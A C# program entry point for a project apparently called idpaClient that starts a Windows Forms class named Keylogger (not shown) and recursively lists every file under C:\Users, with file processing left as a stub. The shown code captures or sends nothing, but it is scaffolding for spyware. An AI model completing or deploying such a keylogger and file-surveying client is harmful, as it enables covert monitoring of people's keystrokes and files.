using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;

namespace idpaClient
{
    class Program
    {
        private static string path = "C:\\Users";

        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Keylogger());

            Console.ForegroundColor = ConsoleColor.Green;


            if (File.Exists(path))
            {
                //This path is a File
                ProcessFile(path);
            }

            if(Directory.Exists(path))
            {
                ProcessDirectory(path);
                //This path is a directory
            }
            else
            {
                Console.WriteLine("{0} is not a valid file or directory.", path);
            }

            Console.ReadKey(true);
        }

        // Process all files in the directory passed in, recurse on any directories  
        // that are found, and process the files they contain. 
        public static void ProcessDirectory(string targetDirectory)
        {
            // Process the list of files found in the directory. 
            string[] fileEntries = Directory.GetFiles(targetDirectory);
            foreach (string fileName in fileEntries)
                ProcessFile(fileName);

            // Recurse into subdirectories of this directory.
            string[] subdirectoryEntries = Directory.GetDirectories(targetDirectory);
            foreach (string subdirectory in subdirectoryEntries)
            {
                try
                {

                    ProcessDirectory(subdirectory);
                }
                catch (UnauthorizedAccessException)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Acces denied for '{0}'", subdirectory);
                    Console.ForegroundColor = ConsoleColor.Green;
                }
            }
        }

        // Insert logic for processing found files here. 
        public static void ProcessFile(string path)
        {
            Console.WriteLine("Processed file '{0}'.", path);
        }
    }
}
